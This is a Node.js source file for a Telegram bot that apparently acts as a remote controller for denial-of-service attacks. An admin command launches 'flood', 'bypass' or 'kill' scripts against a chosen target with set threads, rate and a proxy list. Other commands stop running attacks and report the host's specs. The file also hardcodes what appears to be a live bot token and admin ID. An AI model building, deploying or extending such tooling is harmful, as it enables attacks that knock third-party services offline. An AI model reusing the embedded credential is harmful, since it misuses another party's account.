const TelegramBot = require('node-telegram-bot-api');
const si = require('systeminformation');
const { spawn } = require('child_process');
const http = require('http');
const url = require('url');

const token = '7937745403:AAFWtjpfNpZ7KUUAzj1Bw7g3arSB8T-EUE0';
const adminId = '6601930239';
const webhookUrl = process.env.WEBHOOK_URL || 'https://your-railway-app.railway.app/webhook';
const port = process.env.PORT || 3000;
const bot = new TelegramBot(token);
const processes = {};

async function startBot() {
  try {
    await bot.setWebHook(webhookUrl);
    console.log(`Webhook set to ${webhookUrl}`);
    
    const server = http.createServer((req, res) => {
      if (req.method === 'POST' && req.url === '/webhook') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
          try {
            const update = JSON.parse(body);
            bot.processUpdate(update);
            res.writeHead(200);
            res.end('OK');
          } catch (error) {
            console.error('Webhook error:', error);
            res.writeHead(500);
            res.end('Error');
          }
        });
      } else {
        res.writeHead(404);
        res.end('Not found');
      }
    });

    server.listen(port, () => console.log(`Server listening on port ${port}`));

  } catch (error) {
    console.error('Failed to set webhook:', error.message);
    bot.sendMessage(adminId, `*Bot Error:* Failed to initialize webhook. Check token and Railway configuration.`, { parse_mode: 'Markdown' }).catch(() => {});
    process.exit(1);
  }
}

bot.onText(/\/attack (.+)/, (msg, match) => {
  const userId = msg.from.id;
  if (userId.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, '*Access denied!* Only admin can use this command.', { parse_mode: 'Markdown' });
    return;
  }

  const args = match[1].split(' ');
  if (args.length < 3) {
    bot.sendMessage(msg.chat.id, '*Invalid command!* Usage: /attack [target] [time] [method]\nMethods: flood, bypass, kill', { parse_mode: 'Markdown' });
    return;
  }

  const [target, time, method] = args;
  const validMethods = ['flood', 'bypass', 'kill'];
  if (!validMethods.includes(method)) {
    bot.sendMessage(msg.chat.id, '*Invalid method!* Choose: flood, bypass, kill', { parse_mode: 'Markdown' });
    return;
  }

  const rate = 25;
  const threads = 10;
  const proxyfile = 'prx.txt';
  const process = spawn('node', [`${method}.js`, target, time, rate, threads, proxyfile]);

  const attackId = Object.keys(processes).length + 1;
  processes[attackId] = process;

  bot.sendMessage(msg.chat.id, `*Attack started!*\nID: ${attackId}\nTarget: ${target}\nTime: ${time}s\nMethod: ${method}\nRate: ${rate}\nThreads: ${threads}\nProxyfile: ${proxyfile}`, { parse_mode: 'Markdown' });

  process.on('exit', () => {
    bot.sendMessage(msg.chat.id, `*Attack ${attackId} finished!*`, { parse_mode: 'Markdown' });
    delete processes[attackId];
  });

  process.on('error', (error) => {
    bot.sendMessage(msg.chat.id, `*Attack ${attackId} failed:* ${error.message}`, { parse_mode: 'Markdown' });
    delete processes[attackId];
  });
});

bot.onText(/\/system/, async (msg) => {
  const userId = msg.from.id;
  if (userId.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, '*Access denied!* Only admin can use this command.', { parse_mode: 'Markdown' });
    return;
  }

  try {
    const cpu = await si.cpu();
    const mem = await si.mem();
    const disk = await si.fsSize();
    const osInfo = await si.osInfo();

    const message = `*System Information*\n\n` +
      `*CPU*: ${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores)\n` +
      `*RAM*: ${Math.round(mem.total / 1024 / 1024 / 1024)} GB (Free: ${Math.round(mem.free / 1024 / 1024 / 1024)} GB)\n` +
      `*Swap*: ${Math.round((await si.mem()).swaptotal / 1024 / 1024 / 1024)} GB\n` +
      `*Disk*: ${disk[0].fs} - ${Math.round(disk[0].size / 1024 / 1024 / 1024)} GB (Used: ${Math.round(disk[0].used / 1024 / 1024 / 1024)} GB)\n` +
      `*OS*: ${osInfo.distro} ${osInfo.release}`;

    bot.sendMessage(msg.chat.id, message, { parse_mode: 'Markdown' });
  } catch (error) {
    bot.sendMessage(msg.chat.id, '*Error retrieving system information!*', { parse_mode: 'Markdown' });
  }
});

bot.onText(/\/stop (.+)/, (msg, match) => {
  const userId = msg.from.id;
  if (userId.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, '*Access denied!* Only admin can use this command.', { parse_mode: 'Markdown' });
    return;
  }

  const attackId = match[1];
  if (!processes[attackId]) {
    bot.sendMessage(msg.chat.id, `*No attack found with ID ${attackId}!*`, { parse_mode: 'Markdown' });
    return;
  }

  processes[attackId].kill();
  bot.sendMessage(msg.chat.id, `*Attack ${attackId} stopped!*`, { parse_mode: 'Markdown' });
  delete processes[attackId];
});

bot.on('error', (error) => {
  console.error('Bot error:', error);
  bot.sendMessage(adminId, `*Bot Error:* ${error.message}`, { parse_mode: 'Markdown' }).catch(() => {});
});

startBot();
